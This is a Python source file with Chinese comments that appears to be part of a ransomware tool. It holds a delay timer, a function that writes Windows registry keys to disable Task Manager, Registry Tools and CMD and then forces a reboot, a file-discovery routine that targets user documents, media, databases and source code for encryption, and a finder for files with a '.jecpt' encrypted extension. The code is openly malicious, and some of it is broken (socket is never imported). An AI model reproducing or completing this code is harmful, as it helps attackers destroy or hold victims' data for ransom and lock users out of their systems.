#! encoding:utf-8

import sys,time,os

skip_dic=['/usr/','/etc/']
def get_os():
    '''检查os'''
    try:
        if sys.platform.lower().startswith('linux'):
            return'linux'
        elif sys.platform.lower().startswith('darwin'):
            return 'macos'
        elif sys.platform.lower().startswith('win32') or sys.platform.lower().startswith('cygwin'):
            return 'windows'
    except:
        pass


def get_host_ip():
    """ 获取主机内网ip """
    """
    这个方法是目前见过最优雅获取本机服务器的IP方法了。没有任何的依赖，也没有去猜测机器上的网络设备信息。
    而且是利用 UDP 协议来实现的，生成一个UDP包，把自己的 IP 放如到 UDP 协议头中，然后从UDP包中获取本机的IP。
    这个方法并不会真实的向外部发包，所以用抓包工具是看不到的。但是会申请一个 UDP 的端口，所以如果经常调用也会比较耗时的，这里如果需要可以将查询到的IP给缓存起来，性能可以获得很大提升。
    :return:
    """
    _local_ip=None
    s = None
    try:
        if not _local_ip:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 80))
            _local_ip = s.getsockname()[0]
        return _local_ip
    finally:
        if s:
            s.close()

def time_clock(timer):
    """ 计时器，设定指定秒数后开始计时，计时结束返回true
    参数timer单位为秒，一分钟是60，一小时是3600，一天是86400，使用该函数时建议以天为逻辑单位，避免闰月/大小月等情况
     """
    first_time=time.time();
    secend_time=first_time+timer
    while True:
        time.sleep(5)
        if time.time()>=secend_time:
            return True
            break
        else:pass


def disable_win_cmd():
    '''从注册表直接禁用cmd，然后执行shutdown关机'''
    try:
        os.system('REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /t REG_DWORD /v DisableRegistryTools /d 1 /f')
        os.system('REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /t REG_DWORD /v DisableTaskMgr /d 1 /f')
        os.system('REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /t REG_DWORD /v DisableCMD /d 1 /f')
        os.system('shutdown /r /f /t 3')
    except:
        os.system('shutdown /r /f /t 3')


def discoverFiles_encry(startpath):
    '''
    从指定路径开始遍历文件，返回yield生成器内容
    '''
    '''
    TAG:
     - 未完成错误检查。假定当前用户具有 rwx 
          每个文件和目录从开始路径向下

        - 状态不保留。如果此函数在任何点引发异常，则
          没有办法知道从哪里开始

    '''

    extensions = [
        # 'exe,', 'dll', 'so', 'rpm', 'deb', 'vmlinuz', 'img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
        'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd', 'raw', # images
        'mp3','mp4', 'm4a', 'aac','ogg','flac', 'wav', 'wma', 'aiff', 'ape', # music and sound
        'avi', 'flv', 'm4v', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf', '3gp', # Video and movies

        'doc', 'docx', 'xls', 'xlsx', 'ppt','pptx', # Microsoft office
        'odt', 'odp', 'ods', 'txt', 'rtf', 'tex', 'pdf', 'epub', 'md', # OpenOffice, Adobe, Latex, Markdown, etc
        'yml', 'yaml', 'json', 'xml', 'csv', # structured data
        'db', 'sql', 'dbf', 'mdb', 'iso', # databases and disc images

        'html', 'htm', 'xhtml', 'php', 'asp', 'aspx', 'js', 'jsp', 'css', # web technologies
        'c', 'cpp', 'cxx', 'h', 'hpp', 'hxx', # C source code
        'java', 'class', 'jar', # java source code
        'ps', 'bat', 'vb', # windows based scripts
        'awk', 'sh', 'cgi', 'pl', 'ada', 'swift', # linux/mac based scripts
        'go', 'py', 'pyc', 'bf', 'coffee', # other source code files

        'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak',  # compressed formats
    ]

    for dirpath, dirs, files in os.walk(startpath):
        for i in files:
            absolute_path = os.path.abspath(os.path.join(dirpath, i))
            ext = absolute_path.split('.')[-1]
            if ext in extensions:
                yield absolute_path

def discoverFiles_decry(startpath):
    '''解密时用到的文件发现函数，检测所有后缀带有jecpt的加密文件'''
    ext = ".jecpt"
           
    files_to_dec = []
    for root, dirs, files in os.walk("/"):
        for file in files:
            if file.endswith(str(ext)):
                yield os.path.join(root, file)